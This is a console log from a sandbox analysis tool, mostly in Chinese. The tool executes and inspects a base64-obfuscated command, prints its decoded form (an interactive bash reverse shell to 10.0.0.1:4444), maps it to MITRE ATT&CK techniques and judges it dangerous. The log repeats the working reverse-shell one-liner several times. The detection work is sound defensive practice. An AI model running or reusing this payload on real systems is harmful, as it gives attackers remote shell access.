
[1m==========================================
  OpenSandbox Behavioral Analysis Engine v4
==========================================[0m

[0;36m[INFO][0m  待检测命令: echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=' | base64 -d | bash

[0;36m[INFO][0m  [Step 1/7] 检查环境...
[0;32m[ OK ][0m Docker: Docker version 27.5.1, build 27.5.1-0ubuntu3~24.04.2
[0;32m[ OK ][0m Python: Python 3.12.3
[0;36m[INFO][0m  安装 uv...
downloading uv 0.10.12 x86_64-unknown-linux-gnu
no checksums to verify
installing to /root/.local/bin
  uv
  uvx
everything's installed!
[0;32m[ OK ][0m uv: uv 0.10.12 (x86_64-unknown-linux-gnu)
[0;36m[INFO][0m  [Step 2/7] 预拉取 Docker 镜像...
[0;32m[ OK ][0m 沙箱镜像: opensandbox/code-interpreter:v1.0.2 (已存在)
[0;32m[ OK ][0m Execd镜像: opensandbox/execd:v1.0.7 (已存在)
[0;36m[INFO][0m  [Step 3/7] 安装 Python 依赖...
[0;32m[ OK ][0m opensandbox-server + SDK 已安装
[0;36m[INFO][0m  [Step 4/7] 生成服务端配置...
[0;32m[ OK ][0m 配置写入: /tmp/tmp.kCG5RdeIOc/sandbox.toml
[0;36m[INFO][0m  [Step 5/7] 启动 OpenSandbox Server...
[0;32m[ OK ][0m Server 就绪 (PID: 703611, port: 8080)
[0;36m[INFO][0m  [Step 6/7] 创建沙箱并执行深度行为分析...

/tmp/tmp.kCG5RdeIOc/checker.py:803: SyntaxWarning: invalid escape sequence '\$'
  "echo '=== cron.d ==='; for f in /etc/cron.d/*; do [ -f \"\$f\" ] && echo \"--- \$f ---\" && cat \"\$f\"; done 2>/dev/null || true; "

============================================================================
  1/9  创建隔离沙箱
============================================================================
  镜像: opensandbox/code-interpreter:v1.0.2
  Sandbox ID: 509ddbb2-7388-4136-a9c1-51eb32dc340f

============================================================================
  2/9  安装监控工具 (快照前, 避免污染基线)
============================================================================
  监控工具已安装

============================================================================
  3/9  采集执行前基线 (24 维度)
============================================================================
  文件数       : 221689
  SUID/SGID    : 14
  符号链接     : 483
  文件能力     : 1
  基线采集耗时 : 15.0s
  CPU          : 2.3%
  Memory       : 1851.6/15069.3 MiB

============================================================================
  4/9  启动多层探针 + 执行待测命令
============================================================================
  [探针1] inotify: /usr/local/bin /usr/bin /usr/sbin /etc /root /home
  [探针2] inotify: /tmp /var/tmp /dev/shm (独立探针)
  [探针3] network: /proc/net/tcp 轮询 (0.5s)
  [探针5] process: 进程树轮询 (1s)

  --- 命令链分解分析 ---
    命令包含 3 个执行阶段:
    [1] [OK] echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=' |
    [2] [OK] base64 -d |
    [3] [OK] bash END

  --- 命令去混淆分析 ---
    !! [base64] 发现编码层: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80...
       解码结果: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
    去混淆后命令: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 | bash

  --- 命令静态分析 ---
    !! [T1059.004] base64 decode piped to shell (score: 40)
    !! [T1059.004] reverse shell via /dev/tcp (score: 40) (via 去混淆命令)
    !! [T1059.004] interactive bash reverse shell (score: 45) (via 去混淆命令)

  $ echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=' | base64 -d | bash
  ────────────────────────────────────────────────────────────

  耗时     : 134.5s
  退出码   : 1
  stdout   : 0 行
  stderr   : 2 行

  --- stderr (前 30 行) ---
    | bash: connect: Connection timed out
    | bash: line 1: /dev/tcp/10.0.0.1/4444: Connection timed out

============================================================================
  5/9  采集执行后快照 (全维度)
============================================================================
  文件数       : 221689
  SUID/SGID    : 14
  inotify 系统 : 0 条
  inotify /tmp : 202356 条

============================================================================
  6/9  网络行为深度分析
============================================================================

  --- 外部连接 (出站) ---
    (无外部连接)

    [33 个内部连接已忽略]

  --- DNS 配置 ---
    PASS  /etc/resolv.conf 未被修改

============================================================================
  7/9  全维度安全对比分析 (24 维度)
============================================================================

  --- [D1] 文件变更 (+0 / -0) ---
    (无新增)

  --- [D2] 实时文件事件 (inotifywait) ---
    系统目录: (无事件)
    临时目录事件 (5868 条):
      2026-03-20T04:07:40 CREATE /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD
      2026-03-20T04:07:40 MODIFY /tmp/sortG4cdjD

  --- [D3] 用户与权限 ---
    PASS  /etc/passwd, shadow, sudoers, SSH, PAM 无变化

  --- [D4] 持久化 (cron/systemd/rc.local/init.d/at) ---
    PASS  无新增

  --- [D5] Shell 环境 (.bashrc/.profile/etc) ---
    PASS  无变化

  --- [D6] 进程树分析 ---
    观察到 18 个独立进程:
      > /opt/opensandbox/execd
      > COMMAND
      > \_ bash
      > \_ bash -c find / -xdev -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' -not -path '/run/*' -type f -printf
      > \_ bash -c find / -xdev \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \; 2>/dev/null | sort
      > \_ bash -c find /etc /root /home /tmp /usr/local/bin -maxdepth 3 -type l -exec ls -la {} \; 2>/dev/null | sort || true
      > \_ bash -c getcap -r / 2>/dev/null | sort || true
      > \_ bash -c { echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=' | base64 -d | bash ; }; echo "__EXIT_CODE__$?"
      > \_ cat /proc/net/tcp /proc/net/tcp6
      > \_ find /etc /root /home /tmp /usr/local/bin -maxdepth 3 -type l -exec ls -la {} ;
      > \_ getcap -r /
      > \_ sort
      > tail -f /dev/null
      > |   \_ [ls]
      > |   \_ find / -xdev ( -perm -4000 -o -perm -2000 ) -type f -exec ls -la {} ;
      > |   \_ find / -xdev -not -path /proc/* -not -path /sys/* -not -path /dev/* -not -path /run/* -type f -printf %s %T@ %p n
      > |   \_ getcap -r /
      > |   \_ sort

    残留进程 (执行后):
      USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
      root           1  0.0  0.0   3156  1792 ?        Ss   04:04   0:00 tail -f /dev/null
      root           7  4.1  0.1 1244224 23416 ?       Sl   04:04   0:07 /opt/opensandbox/execd
      root        1762  0.0  0.0   4752  3456 ?        S    04:07   0:00  \_ bash -c find / -xdev -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' -not -path '/run/*' -type f -printf '%s %T@ %p\n' 2>/dev/null | sort
      root        1763  0.0  0.0   4084  2432 ?        R    04:07   0:00  |   \_ find / -xdev -not -path /proc/* -not -path /sys/* -not -path /dev/* -not -path /run/* -type f -printf %s %T@ %p n
      root        1764  0.0  0.0  24904  3200 ?        R    04:07   0:00  |   \_ sort
      root        1765  0.0  0.0   4752  3584 ?        S    04:07   0:00  \_ bash -c ps auxf 2>/dev/null || ps aux
      root        1767  0.0  0.0   8280  4352 ?        R    04:07   0:00  |   \_ ps auxf
      root        1766  0.0  0.0   4752  3712 ?        S    04:07   0:00  \_ bash -c { echo '=== CRONTAB ==='; crontab -l 2>/dev/null || true; echo '=== /etc/crontab ==='; cat /etc/crontab 2>/dev/null || true; echo '=== cron.d ==='; for f in /etc/cron.d/*; do [ -f "\$f" ] && echo "--- \$f ---" && cat "\$f"; done 2>/dev/null || true; echo '=== cron.daily ==='; ls /etc/cron.daily/ 2>/dev/null | sort || true; echo '=== systemd user ==='; ls ~/.config/systemd/user/*.service 2>/dev/null || true; echo '=== systemd system ==='; ls /etc/systemd/system/*.service 2>/dev/null || true; echo '=== rc.local ==='; cat /etc/rc.local 2>/dev/null || true; echo '=== init.d ==='; ls /etc/init.d/ 2>/dev/null | sort || true; echo '=== at queue ==='; atq 2>/dev/null || true; echo '=== systemd timers ==='; systemctl list-timers --no-pager 2>/dev/null || true; } | md5sum
      root        1769  0.0  0.0   4852  2208 ?        S    04:07   0:00  |   \_ bash -c { echo '=== CRONTAB ==='; crontab -l 2>/dev/null || true; echo '=== /etc/crontab ==='; cat /etc/crontab 2>/dev/null || true; echo '=== cron.d ==='; for f in /etc/cron.d/*; do [ -f "\$f" ] && echo "--- \$f ---" && cat "\$f"; done 2>/dev/null || true; echo '=== cron.daily ==='; ls /etc/cron.daily/ 2>/dev/null | sort || true; echo '=== systemd user ==='; ls ~/.config/systemd/user/*.service 2>/dev/null || true; echo '=== systemd system ==='; ls /etc/systemd/system/*.service 2>/dev/null || true; echo '=== rc.local ==='; cat /etc/rc.local 2>/dev/null || true; echo '=== init.d ==='; ls /etc/init.d/ 2>/dev/null | sort || true; echo '=== at queue ==='; atq 2>/dev/null || true; echo '=== systemd timers ==='; systemctl list-timers --no-pager 2>/dev/null || true; } | md5sum
      root        1771  0.0  0.0   8328  3072 ?        S    04:07   0:00  |   \_ md5sum
      root        1768  0.0  0.0   4752  3456 ?        S    04:07   0:00  \_ bash -c awk -F: '{print $1":"$3":"$7}' /etc/passwd 2>/dev/null | sort; echo '---SHADOW---'; wc -l /etc/shadow 2>/dev/null || true; echo '---SUDOERS---'; cat /etc/sudoers 2>/dev/null | md5sum; ls /etc/sudoers.d/ 2>/dev/null | sort || true; echo '---SSH---'; find /root/.ssh /home -name 'authorized_keys' -exec md5sum {} \; 2>/dev/null || echo 'no-ssh'; echo '---PAM---'; ls /etc/pam.d/ 2>/dev/null | sort | md5sum
      root        1773  0.0  0.0      0     0 ?        R    04:07   0:00  |   \_ [awk]
      root        1774  0.0  0.0  24904  3200 ?        R    04:07   0:00  |   \_ sort
      root        1770  0.0  0.0   4752  3584 ?        R    04:07   0:00  \_ bash -c cat ~/.bashrc ~/.bash_profile ~/.profile ~/.bash_logout /etc/profile /etc/bash.bashrc /etc/environment /etc/profile.d/*.sh 2>/dev/null | md5sum
      root        1776  0.0  0.0   4752  2944 ?        R    04:07   0:00  \_ bash -c find / -xdev \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \; 2>/dev/null | sort

  --- [D7] 残留网络连接 ---
        sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
         0: 0100007F:A15A 0100007F:AEE4 01 00000000:00000000 02:00000000 00000000     0        0 4515638 2 0000000000000000 20 4 30 10 -1                  
         1: 0100007F:A170 0100007F:AEE4 01 00000000:00000000 02:00000000 00000000     0        0 4519782 2 0000000000000000 20 4 30 10 -1                  
         2: 0100007F:925E 0100007F:AEE4 01 00000000:00000000 02:00000463 00000000     0        0 4495449 2 0000000000000000 20 4 30 10 -1                  
         3: 0100007F:ABCA 0100007F:AEE4 01 00000000:00000000 02:00000000 00000000     0        0 4521165 2 0000000000000000 20 4 30 10 -1                  
         4: 0100007F:E49C 0100007F:AEE4 01 00000000:00000000 02:000009D0 00000000     0        0 4527829 2 0000000000000000 20 4 30 10 -1                  
         5: 0100007F:B252 0100007F:AEE4 01 00000000:00000000 02:000002CA 00000000     0        0 4498804 2 0000000000000000 20 4 30 10 -1                  
         6: 0100007F:90E2 0100007F:AEE4 01 00000000:00000000 02:000002ED 00000000     0        0 4495673 2 0000000000000000 20 4 30 10 -1                  
         7: 0100007F:C6F8 0100007F:AEE4 01 00000000:00000000 02:00000530 00000000     0        0 4498089 2 0000000000000000 20 4 30 10 -1                  
         8: 0100007F:912C 0100007F:AEE4 01 00000000:00000000 02:00000421 00000000     0        0 4499467 2 0000000000000000 20 4 30 10 -1                  
         9: 0100007F:B282 0100007F:AEE4 01 00000000:00000000 02:00000463 00000000     0        0 4501860 2 0000000000000000 20 4 30 10 -1                  
        10: 0100007F:A148 0100007F:AEE4 01 00000000:00000000 02:00000000 00000000     0        0 4521070 2 0000000000000000 20 4 30 10 -1                  
        11: 0100007F:90C4 0100007F:AEE4 01 00000000:00000000 02:000002EE 00000000     0        0 4489982 2 0000000000000000 20 4 30 10 -1                  
        12: 0100007F:E4AA 0100007F:AEE4 01 00000000:00000000 02:00000AEA 00000000     0        0 4535447 2 0000000000000000 20 4 30 10 -1                  
        13: 0100007F:A188 0100007F:AEE4 01 00000000:00000000 02:00000000 00000000     0        0 4522367 2 0000000000000000 20 4 8 10 -1                   

  --- [D8] 资源消耗 ---
    CPU    : 2.3% -> 4.0% (Δ +1.8%)
    Memory : 1851.6 -> 1874.1 MiB (Δ +22.5 MiB)

  --- [D9] 可疑二进制 (/tmp /var/tmp /dev/shm) ---
    PASS

  --- [D10] SUID/SGID 文件变更 ---
    PASS  无新增 SUID/SGID 文件

  --- [D11] 内核模块 ---
    PASS  无变化

  --- [D12] 挂载点 ---
    PASS  无变化

  --- [D13] 安全相关环境变量 ---
    PASS  无变化

  --- [D14] 关键文件内容分析 ---
    PASS  未发现恶意内容模式

  --- [D15] 关键系统二进制完整性 ---
    PASS  /bin/bash, su, sudo, passwd, sshd 等均未被篡改

  --- [D16] 符号链接变更 ---
    PASS  无新增符号链接

  --- [D17] 文件能力 (Linux Capabilities) ---
    PASS  无新增文件能力

  --- [D18] 输出内容分析 ---
    PASS  输出内容无敏感信息泄露

  --- [D19] 新增文件熵分析 ---
    PASS  无异常高熵文件

  --- [D20] 计划任务详细差异 ---
    PASS  计划任务无变化

  --- [D21] 隐藏进程检测 ---
    PASS  未发现隐藏进程

  --- [D22] 信号处理 / trap 分析 ---
    PASS  未发现恶意信号处理

  --- [D23] 攻击链关联分析 ---
    PASS  未检测到攻击链组合

  --- [D24] 敏感文件权限变更 ---
    PASS  敏感文件权限正常

============================================================================
  8/9  MITRE ATT&CK 技术映射
============================================================================
    [T1059.004] Command and Scripting Interpreter: Unix Shell
      └─ 命令匹配恶意模式: base64 decode piped to shell
      └─ 命令匹配恶意模式: reverse shell via /dev/tcp
      └─ 命令匹配恶意模式: interactive bash reverse shell
    [T1140] Deobfuscate/Decode Files or Information
      └─ 命令包含 base64 编码层

============================================================================
  9/9  综合判定
============================================================================

  +──────────────────────────────────────────────────────────────────────────+
  |  [!!] 判定: DANGEROUS             风险评分: 100/100            |
  |  [████████████████████████████████████████]                              |
  |  置信度: HIGH    维度覆盖:  2/24              |
  +──────────────────────────────────────────────────────────────────────────+

  命令           : echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=' | base64 -d | bash
  合法命令模式   : 否
  退出码         : 1
  文件 +/-       : +0 / -0
  inotify 事件   : 0 系统 + 5868 临时
  外部连接       : 0 个
  SUID/SGID 变更 : +0
  二进制完整性   : PASS
  新增符号链接   : 0
  新增文件能力   : 0
  执行耗时       : 134.5s
  MITRE 技术     : 2 个
  ATT&CK 战术    : Defense Evasion, Execution
  发现           : 3 critical, 1 warnings, 0 info
  置信度         : HIGH

  详细发现 (按严重程度排序):
    [!!!] [静态分析] 命令匹配恶意模式: base64 decode piped to shell [T1059.004] (score: 40)
    [!!!] [静态分析] 命令匹配恶意模式: reverse shell via /dev/tcp [T1059.004] (score: 40)
    [!!!] [静态分析] 命令匹配恶意模式: interactive bash reverse shell [T1059.004] (score: 45)
    [ ! ] [去混淆] 命令包含 base64 编码层 [T1140] (score: 15)

  安全建议:
    -> BLOCK: 强烈建议阻止此命令执行
    -> 检查网络连接: ss -tunap | grep ESTABLISHED

  报告 (JSON) : /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773979696.json
  报告 (文本) : /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773979696.txt
  报告 (SARIF): /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773979696.sarif.json

  快速预判: BLOCK (静态分: 100, 模式匹配: 3)

============================================================================
  人类可读摘要:
============================================================================
  🚨 判定: DANGEROUS (风险分: 100/100, 置信度: HIGH)
  命令: echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=' | base64 -d | bash
  
  发现 4 个问题 (3 严重, 1 警告):
    [CRITICAL] 静态分析: 命令匹配恶意模式: base64 decode piped to shell [T1059.004]
    [CRITICAL] 静态分析: 命令匹配恶意模式: reverse shell via /dev/tcp [T1059.004]
    [CRITICAL] 静态分析: 命令匹配恶意模式: interactive bash reverse shell [T1059.004]
    [WARN] 去混淆: 命令包含 base64 编码层 [T1140]
  
  涉及 ATT&CK 战术: Defense Evasion, Execution
  
  建议:
    • BLOCK: 强烈建议阻止此命令执行
    • 检查网络连接: ss -tunap | grep ESTABLISHED

  沙箱已销毁。


[0;36m[INFO][0m  [Step 7/7] 完成!
[0;32m[ OK ][0m 报告 (JSON): /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773979696.json
[0;32m[ OK ][0m 报告 (文本): /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773979696.txt
  查看: python3 -m json.tool /home/ecs-user/skill-analysis/command-analysis-with-sandbox-plugin/reports/black/safety_report_1773979696.json
  快速预判: FAST_TRIAGE=1 COMMAND='...' ./checker.sh

[0;36m[INFO][0m  Cleaning up...
[0;32m[ OK ][0m Cleanup done.
